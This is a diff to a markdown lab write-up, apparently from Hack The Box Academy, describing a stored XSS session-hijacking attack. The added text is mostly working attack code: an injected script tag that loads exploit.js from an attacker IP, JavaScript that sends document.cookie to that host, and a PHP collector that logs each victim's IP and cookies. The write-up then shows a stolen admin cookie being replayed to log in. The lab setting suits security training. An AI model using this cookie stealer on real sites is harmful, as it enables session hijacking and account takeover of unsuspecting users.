@@ -136,12 +136,48 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 <script>$.getScript("http://OUR_IP")</script>
 ```  
 
->Successfully Identified the URL field with this payload: `"><script src=http://10.10.15.41/3l33t.js></script>`, Loading a Remote Script.  
+>Successfully Identified the URL field with this payload: `"><script src=http://10.10.15.41/exploit.js></script>`, Loading a Remote Script.  
 
+>A session hijacking attack is similar to the phishing attack, It requires a JavaScript payload to send attacker the required data and a PHP script hosted on attack host to grab and parse the transmitted data.  
 
+### Setup Cookie Stealer  
 
+>Kali hosting PHP server with `php -S 0.0.0.0:80` the following two files: 
 
+>The source code for `exploit.js`:
+```javascript
+// document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://10.10.15.41/index.php?c='+document.cookie;
+```  
 
+The PHP source code for `index.php`:  
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```  
 
+>Burp Suite Send the payload and wait for the Admin user to review our page registration, that contain the stored XSS cookie stealer payload in the `imgurl=` parameter.  
 
+![burp-repeater-send-cookie-stealer-stored-xss](/images/burp-repeater-send-cookie-stealer-stored-xss.png)  
 
+>Execute the attack and wait for PHP exploit service to receive the admin cookie value.
+
+![cookie-stealer-exploit](/images/cookie-stealer-exploit.png)  
+
+>Stolen cookie value received and stored in `cookies.txt` file.  
+```
+Victim IP: 10.129.34.48 | Cookie: cookie=c00k1355h0u1d8353cu23d
+```
+
+>Then use saved cookie value into browser session at `http://victim.htb/login.php` to gain access.  
+
+>[Remediation and prevention secure coding practices](https://academy.hackthebox.com/module/103/section/1009)  
